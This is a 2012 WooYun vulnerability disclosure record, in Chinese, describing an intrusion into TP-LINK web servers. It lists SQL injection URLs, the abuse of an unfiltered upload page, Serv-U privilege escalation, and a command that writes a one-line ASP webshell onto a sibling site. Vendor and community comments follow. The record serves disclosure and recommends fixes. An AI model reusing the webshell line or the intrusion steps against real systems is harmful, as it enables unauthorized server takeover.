{"id": 17357, "wybug_id": "wooyun-2012-012226", "wybug_title": "TP-LINK某站漏洞导致几个分站沦陷", "wybug_corp": "深圳普联技术有限公司", "wybug_author": "pangshenjie", "wybug_date": "2012-09-21 15:17", "wybug_open_date": "2012-09-26 15:18", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某天准备买个无线网卡，不小心就搞了下官网。。。之前在wooyun有人发过，不过官方修补不彻底，囧。。其实就是修补了那个页面的过滤，厂商不重视安全，这是为什么呢？ 详细说明：  注入点几枚\nhttp://www.tp-link.cn/pages/smb/products.asp?c=3\n\nhttp://www.tp-link.cn/pages/article-detail.asp?result=school&d=157\n厂商还是全部代码都查查吧，全局过滤一下。sqlmap跑出了密码:\n\n后台的安全是在是不可以恭维啊。http://www.tp-link.cn/pages/cms/upload.asp什么都不过滤。。。shell的权限挺小的，这个目录不支持aspx，本盘不能跨目录。\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\Temporary ASP.NET Files\\root\\\n目录下读取到了支持aspx的目录读取C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\Temporary ASP.NET Files\\root\\f6ef54bd\\de1a25fb\\App_Web_8tlihkqz.0.cs文件发现还有aspx的站在服务器上。跨不过去，翻了下43598端口开了，用servu的提权脚本执行：\nwhoami >I:\\tpwebroot\\download\\2.txt\n发现servu被降权了，是user权限，不过权限也很高了，试着一下dir I:\\ >I:\\tpwebroot\\download\\3.txt,列出目录了，有读取权限，一层一层读下去，找到了其他网站的路径，直接\necho ^<%execute^(request^(\"#\"^)^)%^> >I:\\mobileMVC\\test.asp\n搞到了http://www.tp-linkmobile.com.cn/，同理还有http://bbs.tp-linkmobile.com.cn。。。后面就不继续了，希望厂商还是控制下目录权限吧，好多个应用放到一个站。   漏洞证明：  \n\n\n\n   修复方案：  主站的注入彻底修复下吧，servu的那个权限修改下，目录的权限也修改下吧。   版权声明：转载请注明来源 pangshenjie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-09-26 15:18 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-26 16:21 |    \t\t剑心 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:9        | xsser)\t\t \n  @xsser @pangshenjie 洞主就是我说的菊花哥    \n     2012-09-26 17:03 |    \t\t苦逼老爷爷 \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:17        | 用户太懒什么都没留下)\t\t \n  可怜的lz...洞被修好了，然后华丽丽的忽略了。    \n     2012-09-26 17:09 |    \t\t深圳普联技术有限公司(乌云厂商)\t\t \n  非常谢谢LZ反馈，没有及时上这来处理，抱歉    \n     2012-09-26 17:54 |    \t\tMichael \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        )\t\t \n  @深圳普联技术有限公司 @苦逼老爷爷 我报的那个也是修复了以后忽略    \n     2012-09-26 18:42 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @剑心 鼠仙你多少小号    \n     2012-09-26 18:44 |    \t\t剑心 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:9        | xsser)\t\t \n  @pangshenjie 很多    \n     2012-09-26 18:48 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @深圳普联技术有限公司 囧，“危害等级：无影响厂商忽略”    \n     2012-09-26 21:31 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @深圳普联技术有限公司 @xsser 厂商私下里联系过了，态度还是很好的，但是“危害等级：无影响厂商忽略”这种是不是有些厂商不会用还是不了解捏？是不是应该给厂商说明一下。为什么好多厂商都这样呢？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}